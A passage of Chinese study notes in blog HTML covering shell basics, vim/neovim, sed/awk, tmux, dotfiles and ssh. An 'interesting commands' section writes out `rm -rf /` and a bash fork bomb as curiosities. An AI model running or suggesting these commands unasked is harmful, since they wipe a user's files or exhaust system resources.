class="comment"># rm -r 也行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件所有内容</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件开头结尾，默认10行</span></span><br><span class="line">$ <span class="built_in">head</span> test.txt</span><br><span class="line">$ <span class="built_in">tail</span> test.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat 重定向</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt; tmp.txt   <span class="comment"># 如果没有就创建tmp.txt.</span></span><br><span class="line">$ <span class="built_in">cat</span> &lt; text.txt &gt; tmp.txt <span class="comment"># 同上</span></span><br><span class="line">$ <span class="built_in">cat</span> test.txt &gt;&gt; tmp.txt  <span class="comment"># &gt; 会清除原先内容。&gt;&gt; 代表append，追加而不清除</span></span><br></pre></td></tr></table></figure>

<ul>
<li>命令参数和帮助文档</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一般命令也存在参数，一般为 -?</span></span><br><span class="line">$ <span class="built_in">ls</span> -l  /home</span><br><span class="line"><span class="comment"># d: dir rwx: 权限Read, Write, eXecute(也代表是否能够访问此目录)。</span></span><br><span class="line"><span class="comment"># 从前到后: owner权限 group权限 其余用户权限 owner group size date dir_name</span></span><br><span class="line">drwxr-x--- 27 user user 4096 Jun 21 14:42 user  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查帮助文档，q退出。manual pages</span></span><br><span class="line">$ man <span class="built_in">ls</span> </span><br><span class="line"> -l     use a long listing format</span><br></pre></td></tr></table></figure>

<ul>
<li>管道：左侧的输出作为右侧的输入</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> / | <span class="built_in">tail</span> -n 1 <span class="comment"># -n 1 最后一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有时候给root权限文件写入时，比如sudo echo 123 &gt; tmp.txt会报错，可用以下命令</span></span><br><span class="line">$ <span class="built_in">echo</span> 123 | sudo <span class="built_in">tee</span> tmp.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>root user: 超级管理员。尽量少用，在运行错误的程序时会破坏计算机。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户使用root权限</span></span><br><span class="line">$ sudo &lt;commond&gt;</span><br><span class="line"></span><br><span class="line">$ sudo su</span><br><span class="line">password: xxx</span><br><span class="line">root<span class="comment"># `#` 代表root 权限 </span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>/sys</code> 文件夹：各种内核参数，显示设备的状态。linux系统将其视为文件暴漏给用户，意味着我们可以操作从而控制某些设备</p>
</li>
<li><p>有趣的命令</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删库跑路，无需确认强制删除所有的文件</span></span><br><span class="line">$ <span class="built_in">rm</span> -rf /</span><br><span class="line"></span><br><span class="line"><span class="comment"># fork 炸弹, 会耗尽电脑资源</span></span><br><span class="line">$ :()&#123; :|:&amp; &#125;;:  <span class="comment"># 理解为一个函数递归调用 `:` 为函数名</span></span><br><span class="line">:() &#123;</span><br><span class="line">	: | :&amp;</span><br><span class="line">&#125;;</span><br><span class="line">:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于ls打错频率比较高，会出现一个动画(火车)</span></span><br><span class="line">sl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cowsay 打印一段话 cowthink 类似，但是think</span></span><br><span class="line">cowsay <span class="string">&quot;nb&quot;</span></span><br><span class="line">	-l 查看动物，需要安装</span><br><span class="line">	-f 指定动物</span><br><span class="line"> ____</span><br><span class="line">&lt; nb &gt;</span><br><span class="line"> ----</span><br><span class="line">        \   ^__^</span><br><span class="line">         \  (oo)\_______</span><br><span class="line">            (__)\       )\/\</span><br><span class="line">                ||----w |</span><br><span class="line">                ||     ||</span><br><span class="line"></span><br><span class="line"><span class="comment"># figlet 字符字  toilet类似 </span></span><br><span class="line">figlet love</span><br><span class="line"> <span class="string">&quot;&quot;</span><span class="comment">#</span></span><br><span class="line">   <span class="comment">#     mmm   m   m   mmm</span></span><br><span class="line">   <span class="comment">#    #&quot; &quot;#  &quot;m m&quot;  #&quot;  #</span></span><br><span class="line">   <span class="comment">#    #   #   #m#   #&quot;&quot;&quot;&quot;</span></span><br><span class="line">   <span class="string">&quot;mm  &quot;</span><span class="comment">#m#&quot;    #    &quot;#mm&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印一堆信息和logo，装b使用</span></span><br><span class="line">neofetch</span><br></pre></td></tr></table></figure>

<ul>
<li>现代化的命令：开发者使用rust写了很多更加现代的命令，可以替代一些老命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exa  =&gt;  <span class="built_in">ls</span></span><br><span class="line">bat  =&gt;  <span class="built_in">cat</span> </span><br></pre></td></tr></table></figure>

<h4 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><ul>
<li>shell, console, terminal?</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">xxx</span><br></pre></td></tr></table></figure>

<h2 id="lectrue2-shell-script"><a href="#lectrue2-shell-script" class="headerlink" title="lectrue2: shell script"></a>lectrue2: shell script</h2><blockquote>
<p>Linux 脚本的使用</p>
</blockquote>
<ul>
<li>语法</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$0</span>      运行文件名</span><br><span class="line"><span class="variable">$1</span>-<span class="variable">$9</span>   参数</span><br><span class="line">$?      获取上一个运行的错误 0代表正确，1代表出错</span><br><span class="line"><span class="variable">$_</span>      存储上次运行的结果</span><br><span class="line"><span class="variable">$#</span>      参数个数</span><br><span class="line">$$      进程<span class="built_in">id</span></span><br><span class="line"><span class="variable">$@</span>      所有的参数组成，可迭代</span><br><span class="line"></span><br><span class="line">!!      在执行时会替换为上一个执行的命令</span><br><span class="line"><span class="comment"># 变量</span></span><br><span class="line">foo=bar</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$foo</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量赋值为命令的结果</span></span><br><span class="line">foo=$(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>循环</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> xxx; <span class="keyword">do</span>... <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<ul>
<li>条件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> xxx; then...fi</span><br></pre></td></tr></table></figure>

<ul>
<li>编程脚本</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加入magic line 指定解析器</span></span><br><span class="line"><span class="comment"># 一个 称之为 `shebang` 的东西</span></span><br><span class="line"><span class="comment">#!/usr/bin/pyton3</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>man</code> 命令的其余选择 <code>tldr</code> ，更加简洁(too long; don’t read)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tldr tar</span><br></pre></td></tr></table></figure>

<ul>
<li>递归查询</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find .     <span class="comment"># . 代表当前路径，我们可以指定比如 `/` </span></span><br><span class="line">	-name  <span class="comment"># 名称,可以使用通配符</span></span><br><span class="line">	-<span class="built_in">type</span>  <span class="comment"># 类型 d(dir) f(file)</span></span><br><span class="line">	-mtime -1 <span class="comment"># 修改时间modify time， 1指1天</span></span><br><span class="line">	-<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;   <span class="comment"># 对于寻找的文件执行命令 \; 不可缺少</span></span><br><span class="line"></span><br><span class="line">fd  <span class="comment"># 更加现代化的find</span></span><br><span class="line"></span><br><span class="line">locate  <span class="comment"># 默认查找整个计算机</span></span><br><span class="line"></span><br><span class="line">grep  <span class="comment"># 应用于查文件内容</span></span><br><span class="line">	-R  <span class="comment">#  递归</span></span><br><span class="line"></span><br><span class="line">rg  <span class="comment"># ripgrep</span></span><br></pre></td></tr></table></figure>


<ul>
<li>查找使用过的命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">方向键的上</span><br><span class="line"></span><br><span class="line">fzf</span><br><span class="line"></span><br><span class="line">zsh 的一个插件，在输入时会显示曾经输入的类似命令</span><br></pre></td></tr></table></figure>


<ul>
<li>更清晰的目录结构</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tree</span><br><span class="line">broot</span><br></pre></td></tr></table></figure>

<h2 id="lecture3-editor-VIM"><a href="#lecture3-editor-VIM" class="headerlink" title="lecture3: editor VIM"></a>lecture3: editor VIM</h2><ul>
<li><p>normal mode: 可以控制光标，执行命令…</p>
</li>
<li><p>insert mode: 就是文本编辑器。</p>
</li>
<li><p>command mode: 在insert mode 输入 <code>:</code> 在输入命令</p>
</li>
<li><p>visual mode: 有点像使用鼠标选中一块连续区域</p>
</li>
<li><p>replace mode</p>
</li>
<li><p>进入 insert mode</p>
</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">i   <span class="keyword">insert</span>， 在光标前插入</span><br><span class="line"><span class="keyword">a</span>   <span class="keyword">append</span>，在光标后</span><br><span class="line">I   行首</span><br><span class="line">A   行尾</span><br><span class="line"><span class="keyword">o</span>   下一行 <span class="keyword">open</span> <span class="keyword">a</span> <span class="keyword">new</span> <span class="built_in">line</span></span><br><span class="line">O   上一行</span><br></pre></td></tr></table></figure>

<ul>
<li>normal mode</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">esc  也可以自行配置</span><br></pre></td></tr></table></figure>

<ul>
<li><p>保存，退出</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">-- <span class="keyword">write</span> <span class="keyword">quit</span></span><br><span class="line"><span class="keyword">normal</span> <span class="keyword">mode</span> 下 :<span class="keyword">wq</span></span><br><span class="line"></span><br><span class="line">-- 加入 ! 代表强制执行</span><br></pre></td></tr></table></figure>
</li>
<li><p>normal mode 光标操作。</p>
<ul>
<li>所有的都可以在<code>前面加一个数字</code>，代表count</li>
</ul>
</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">h   左移</span><br><span class="line"><span class="keyword">j</span>   下</span><br><span class="line"><span class="keyword">k</span>   上</span><br><span class="line"><span class="keyword">l</span>   右</span><br><span class="line"></span><br><span class="line"><span class="keyword">w</span>   向前(后一个单词)移动一个 word, 也就是一个单词，标点或者空格分开。在单词第一个字母</span><br><span class="line"><span class="keyword">b</span>   向back移动 word      back of word</span><br><span class="line"><span class="keyword">e</span>   移动到单词末尾        end of word</span><br><span class="line"><span class="number">0</span>   移动到行首</span><br><span class="line">$   行尾</span><br><span class="line">^   一行第一个非空字符</span><br><span class="line"></span><br><span class="line">ctrl-<span class="keyword">u</span>     <span class="keyword">up</span>类似鼠标向上滚动</span><br><span class="line">ctrl-d     down 向下</span><br><span class="line"></span><br><span class="line">H  highest  屏幕第一行</span><br><span class="line">L  low      屏幕最后一行</span><br><span class="line">M  mid      屏幕中间一行</span><br></pre></td></tr></table></figure>

<p>删除</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">d  删除一个字符,配合移动光标使用</span><br><span class="line">	dd 删除一行，可以使用<span class="keyword">p</span></span><br><span class="line">	D 删除至末尾</span><br><span class="line">	d1G 删除到第一行</span><br><span class="line">	dG  删除到最后一行</span><br><span class="line">	n1, n2d 删除n1-n2行</span><br><span class="line">	-- 在这里 <span class="keyword">a</span> around;  i inside</span><br><span class="line">	<span class="keyword">di</span>(  删除括号内的内容</span><br><span class="line">	da(  删除包括括号的东西</span><br><span class="line"><span class="keyword">c</span>   <span class="keyword">change</span> <span class="keyword">a</span> word 删除(d 类似)并进入<span class="keyword">insert</span> <span class="keyword">mode</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">x</span>   删除后面一个字符</span><br><span class="line">	<span class="symbol">&lt;num&gt;</span><span class="keyword">x</span> 删除后面num个字符</span><br><span class="line">s   删除字符进入<span class="keyword">insert</span> <span class="keyword">mode</span></span><br><span class="line">S   删除一行进入<span class="keyword">insert</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure>

<ul>
<li>复制粘贴</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">y</span>   <span class="keyword">yank</span> </span><br><span class="line">	yy 复制当前行</span><br><span class="line">	y1G ...</span><br><span class="line"><span class="keyword">p</span>   paste在这一行后面</span><br><span class="line"><span class="keyword">P</span>   这一行前面</span><br></pre></td></tr></table></figure>

<ul>
<li>跳转到某一行</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">g</span><br><span class="line">	gg 第一行</span><br><span class="line">G   最后一行</span><br><span class="line">	<span class="symbol">&lt;num&gt;</span>G  跳转到num行</span><br><span class="line">:<span class="symbol">&lt;num&gt;</span>   跳到第num行</span><br></pre></td></tr></table></figure>

<ul>
<li>撤销之前的操作</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">u</span> <span class="keyword">undo</span></span><br><span class="line">ctrl + r   <span class="keyword">redo</span> 恢复撤销的内容</span><br></pre></td></tr></table></figure>

<ul>
<li>visual mode: 允许我们改变一列，整块复制等</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">v   字符可视，开始和结束两个字符中间所有内容，退出按v</span><br><span class="line">V   行可视行，光标所在行，退出 V</span><br><span class="line">ctrl+v   块可视，开始和结束光标的矩阵，退出ctrl+v</span><br></pre></td></tr></table></figure>

<ul>
<li>搜索</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">f</span><span class="symbol">&lt;word&gt;</span>  本行查找</span><br><span class="line">/<span class="symbol">&lt;word&gt;</span>  查内容,全文</span><br><span class="line">n      继续向下继续找 <span class="keyword">next</span></span><br><span class="line"><span class="keyword">N</span>      继续向上找</span><br></pre></td></tr></table></figure>

<ul>
<li>更改环境</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:<span class="keyword">set</span> <span class="keyword">nu</span>   显示行号</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>~</code> 反转大小写</p>
</li>
<li><p>括号匹配</p>
</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">%   到匹配的另一个括号处</span><br></pre></td></tr></table></figure>

<ul>
<li>tab, window, buffer</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">tab: 我理解为 在系统中打开vim这个软件两次，就是两个tab</span><br><span class="line"></span><br><span class="line">window: vim 屏幕，可以分屏</span><br><span class="line"></span><br><span class="line">buffer: 打开文件，文件具有buffer, 同一个文件同一个buffer,实时。</span><br></pre></td></tr></table></figure>

<ul>
<li>配置，vim 在执行前会加载一个 <code>~/.vimrc</code> 文件。<ul>
<li>我们可以DIY自己的喜欢的按键。</li>
<li>安装插件实现更多的功能</li>
</ul>
</li>
</ul>
<h3 id="neovim"><a href="#neovim" class="headerlink" title="neovim"></a>neovim</h3><ul>
<li>本人使用 <a href="https://neovim.io/">neovim</a> 配合 <a href="https://www.lazyvim.org/">LazyVim</a>。可DIY. 然后再 <code>VsCode</code> 安装neovim插件，同步使用。</li>
<li>常用的操作，neovim也能用。</li>
</ul>
<h4 id="keymap"><a href="#keymap" class="headerlink" title="keymap"></a>keymap</h4><ul>
<li><p>Leader 为 space 键，挺好用, 使用这些功能也需要安装对应插件</p>
</li>
<li><p>打开终端</p>
</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>ft   当前</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fT   /</span><br><span class="line"></span><br><span class="line">ctrl-/    打开和关闭</span><br></pre></td></tr></table></figure>

<ul>
<li>快速注释</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>gc    但是需要指定的 LSP</span><br></pre></td></tr></table></figure>

<ul>
<li>不同文件间(buffer)切换</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>bb</span><br></pre></td></tr></table></figure>

<ul>
<li>文件搜索 telescope</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">-- 文件名</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="symbol">&lt;leader&gt;</span>   <span class="symbol">&lt;esc&gt;</span><span class="symbol">&lt;esc&gt;</span> 退出</span><br><span class="line"></span><br><span class="line">-- 文件内容</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">sb</span></span><br></pre></td></tr></table></figure>

<ul>
<li>文件内</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;c-s&gt;</span> 保存文件</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fn  <span class="keyword">new</span> <span class="keyword">file</span></span><br></pre></td></tr></table></figure>

<ul>
<li>分屏</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>|  <span class="symbol">&lt;leader&gt;</span>|  生动表示竖着</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>-  <span class="symbol">&lt;leader&gt;</span>-  横着</span><br><span class="line"></span><br><span class="line">-- 切换，和<span class="keyword">normal</span> <span class="keyword">mode</span> 下的移动联系</span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> 左</span><br><span class="line"><span class="symbol">&lt;C-j&gt;</span> 下</span><br><span class="line"><span class="symbol">&lt;C-k&gt;</span> 上</span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> 右</span><br></pre></td></tr></table></figure>

<ul>
<li>侧边栏 neo-tree</li>
</ul>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>fe   当前</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fE   /</span><br><span class="line"></span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">e</span>   当前</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>E   /</span><br><span class="line"></span><br><span class="line">-- 侧边栏进入文件后，在进入侧边栏</span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> </span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> </span><br></pre></td></tr></table></figure>

<ul>
<li>lazy.nvim 插件管理非常受欢迎。作者开发的插件和配置。</li>
</ul>
<h2 id="lecture4-data-wrangling"><a href="#lecture4-data-wrangling" class="headerlink" title="lecture4: data wrangling"></a>lecture4: data wrangling</h2><blockquote>
<p>处理数据的某些手段</p>
</blockquote>
<ul>
<li>grep，搜索</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;word&quot;</span> tmp.txt   <span class="comment"># 查询</span></span><br><span class="line">	-R  <span class="comment"># 递归，可以查找文件夹下的文件</span></span><br></pre></td></tr></table></figure>

<ul>
<li>sed，在搜索替换是一个好用的工具。需要学习一下正则表达式</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/&lt;pattern&gt;/&lt;replace&gt;/&#x27;</span></span><br><span class="line">pattern: 匹配模式，支持正则表达式</span><br><span class="line">replace: 将匹配到的pattern 转换为 replace。当捕获时 \num 代表第num个捕获，打印</span><br><span class="line"></span><br><span class="line"><span class="comment"># sed 默认支持很老的正则表达式，使用 `-E` 参数，支持现代化的正则</span></span><br></pre></td></tr></table></figure>

<ul>
<li>一些正则表达式使用，使用在线网站练习。regular expression</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[0-9]   0,1,2...9 其中一个数字</span><br><span class="line">*       贪婪模式，1次或多次</span><br><span class="line">?       0 或 1 次</span><br><span class="line">.       任意字符</span><br><span class="line">()      捕获括号内的内容</span><br><span class="line">^ 开头   $ 末尾</span><br></pre></td></tr></table></figure>

<ul>
<li>wc</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l    word count,统计大小 -l line 几行</span><br></pre></td></tr></table></figure>

<ul>
<li><p>排序，字典序。去重</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span>    默认字典序排序</span><br><span class="line">	-n 按照数值的大小进行排序</span><br><span class="line">	-k 指定排序的列数</span><br><span class="line"><span class="built_in">uniq</span>    可去除重复内容</span><br><span class="line">	-c  记录出现次数</span><br></pre></td></tr></table></figure>
</li>
<li><p>awk，基于流的处理，是一门编程语言</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;script&#x27;</span>  执行一个脚本</span><br><span class="line">awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">	-F  指定分隔符</span><br></pre></td></tr></table></figure>

<ul>
<li>cut，类似编程语言的split</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cut</span> [option] filename</span><br><span class="line">	-d   字节为单位分割  </span><br><span class="line">		<span class="built_in">cut</span> -d 3  第三个字符  -d 3-9,12  第3-9,12个字符</span><br><span class="line">	-f   fields 与-d一起使用，表示区域</span><br><span class="line">		<span class="built_in">cut</span> -d : -f2  第1-2个冒号之前的内容</span><br><span class="line">	-c   character 字符为单位，处理中文好用</span><br><span class="line">	-b   </span><br></pre></td></tr></table></figure>

<ul>
<li>编程语言在命令行的使用? 各种管道，图片音频处理?</li>
</ul>
<h2 id="lecture5-command-line-environment"><a href="#lecture5-command-line-environment" class="headerlink" title="lecture5: command-line environment"></a>lecture5: command-line environment</h2><blockquote>
<p>优雅的使用命令行</p>
</blockquote>
<h3 id="job-control"><a href="#job-control" class="headerlink" title="job control"></a>job control</h3><ul>
<li>Linux 系统的 signal机制</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man signal : 会看到不同的number 和 name</span><br><span class="line"></span><br><span class="line">ctrl-c   SIGINT   signal interrupt</span><br><span class="line">ctrl-\   SIGQUIT</span><br></pre></td></tr></table></figure>

<ul>
<li>ctrl+z</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 暂停，可执行其他任务</span></span><br><span class="line">&amp;     在命令后加入，表示后台执行</span><br><span class="line"><span class="built_in">jobs</span>  查看后台任务，暂停或者运行 pid</span><br><span class="line"><span class="built_in">fg</span> %num / <span class="built_in">bg</span> %num  使暂停的任务继续运行，<span class="built_in">fg</span> 恢复到前台。<span class="built_in">bg</span> 恢复到后台执行。front back ground</span><br><span class="line"><span class="built_in">kill</span> %num            停止</span><br></pre></td></tr></table></figure>

<h3 id="terminal-multiplexers"><a href="#terminal-multiplexers" class="headerlink" title="terminal multiplexers"></a>terminal multiplexers</h3><ul>
<li><p>终端复用，在一个terminal window干很多事情。</p>
</li>
<li><p>很多的终端都存在分屏等操作，但是课程介绍神器 <code>tmux</code>，更加神奇。</p>
<ul>
<li>不 kill session，其中的命令会一直执行下去。只需要开启一次终端。</li>
<li>在ssh 服务器时非常的好用</li>
</ul>
</li>
<li><p>session, window, pune</p>
<ul>
<li>启动tmux, 会开启一个session, 明显的是下面会出现一行数据。</li>
<li>window 创建一个新的shell 终端。</li>
<li>pune 面板，一个窗口可以分很多的面板。</li>
</ul>
</li>
<li><p>命令行操作</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tmux</span><br><span class="line">	下部会出现状态栏，分别是session window1 windiow2...     时间等</span><br><span class="line"></span><br><span class="line">tmux a   <span class="comment"># attach 进入session</span></span><br><span class="line">		-t name  指定名称</span><br><span class="line"></span><br><span class="line">tmux new -t &lt;name&gt;       创建并指定名称</span><br><span class="line">tmux kill-session -t &lt;num/name&gt;  杀死指定的session</span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">ls</span>   查看所有的session</span><br><span class="line"></span><br><span class="line">tmux splitw -h/-v   pane 横竖分割window</span><br></pre></td></tr></table></figure>

<ul>
<li>默认快捷键。可以先按一下 <code>ctrl-b</code> 在按其余的，不需要同时按。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">prefix = Ctrl-b</span><br><span class="line"><span class="comment"># session prefix keymap</span></span><br><span class="line">prefix d   dettach session</span><br><span class="line">prefix s   列出所有session vim快捷键下的选择</span><br><span class="line"></span><br><span class="line"><span class="comment"># window</span></span><br><span class="line">prefix c   create a new window</span><br><span class="line">prefix p   previous window</span><br><span class="line">prefix n   next window</span><br><span class="line">prefix &lt;n&gt; 第n个窗口,n是个数字</span><br><span class="line">prefix w   列出window 和 session(s ?),  jk 选择，enter进入</span><br><span class="line">prefix ,   重命名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pune</span></span><br><span class="line">prefix x       关闭pune</span><br><span class="line">prefix %       竖直切割</span><br><span class="line">prefix <span class="string">&quot;       水平切割</span></span><br><span class="line"><span class="string">prefix 方向键   选择 pune</span></span><br><span class="line"><span class="string">prefix x       关闭pune</span></span><br><span class="line"><span class="string">prefix z       最大化当前窗口，在按一次退出</span></span><br><span class="line"><span class="string">prefix !       分离pune 进入window</span></span><br><span class="line"><span class="string">持续按prefix 方向键  改变pune大小</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>配置快捷键， <code>~/.tmux.conf</code>。我使用的是基于网上找的 <a href="https://www.debugpointer.com/linux/tmux-conf">tmux-conf</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl-b 距离非常有点阴间，因此需要改。ctrl-a 是qemu快捷键。因此选择ctrl-x</span><br><span class="line"></span><br><span class="line">prefix I             install plugins</span><br><span class="line">prefix alt I         uninstall</span><br><span class="line"></span><br><span class="line">alt + 方向键，pune 移动</span><br></pre></td></tr></table></figure>
</li>
<li><p>插件管理 <a href="https://github.com/tmux-plugins/tpm">Tmux Plugin Manager</a></p>
</li>
<li><p>美化+快捷键 系列操作参考。<a href="https://github.com/rothgar/awesome-tmux#themes">awesome-tmux: A list of awesome resources for tmux</a></p>
</li>
</ul>
<h3 id="aliases"><a href="#aliases" class="headerlink" title="aliases"></a>aliases</h3><ul>
<li>给常用的命令设置别名 <ul>
<li>bash 的<code>~/.bashrc</code> 文件</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注意，不要存在 ll = &#x27;ls -l&#x27; 因为在shell script中，空格是有意义的</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br></pre></td></tr></table></figure>


<h3 id="dotfiles"><a href="#dotfiles" class="headerlink" title="dotfiles"></a>dotfiles</h3><ul>
<li><p>各种配置文件。大部分是文件</p>
</li>
<li><p>bash -&gt; <code>~/.bashrc</code></p>
</li>
<li><p>zsh -&gt; <code>~/.zshrc</code>。我们的zsh美化也是修改此文件。</p>
</li>
<li><p>vim -&gt; <code>~/.vimrc</code></p>
</li>
<li><p>tmux -&gt; <code>~/tmux.conf</code></p>
</li>
<li><p>neovim -&gt; <code>~/.config/nvim</code> 目录下的 <code>基于lua</code> 配置</p>
</li>
<li><p>ssh -&gt; <code>~/.ssh</code> 这是一个目录。可以配置公私钥，免密登录。</p>
<ul>
<li>自己的机器 <code>ssh-keygen</code> 命令生成公私钥</li>
<li>将公钥放入服务器的 <code>authorized_keys</code>。权限一般是<code>600</code></li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub  &lt;username&gt;@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用的ssh 传输文件 scp  和cp命令差不多，给出路径</span></span><br><span class="line">scp tmp.txt &lt;user&gt;@&lt;IP&gt;:/tmp</span><br></pre></td></tr></table></figure>

<ul>
<li><p>感兴趣的可以学习一下 <a href="https://nixos.org/">NixOS</a>, 一个基于配置文件的操作系统😋</p>
</li>
<li><p>大部分配置都可在 github 查找到，如果不想自己配置，直接 <code>clone/fork</code> 一个其他人的。</p>
</li>
<li><p>bash 前面的一串的修改</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS1=<span class="string">&quot;user&gt;&quot;</span>   我们shell 前面的一串</span><br></pre></td></tr></table></figure>

<blockquote>
<p>问题：如何在本机和服务器同时使用tmux</p>
</blockquote>
<p>相同的配置会可能产生冲突，或者会使我们不知道操作的是哪一个，因此我们需要不同的配置文件。最简单的就是使用两个 <code>prefix</code> 。</p>
<h2 id="lecture6-virsion-control-git"><a href="#lecture6-virsion-control-git" class="headerlink" title="lecture6: virsion control(git)"></a>lecture6: virsion control(git)</h2><blockquote>
<p>git版本控制</p>
</blockquote>
<ul>
<li><p>开发项目，团队合作，文件损坏的回退。。。git都可以在很大程度上帮助我们，不需要删除在重新下载😘</p>
</li>
<li><p>git 抽象建模。使用有向无环图进行抽象</p>
<ul>
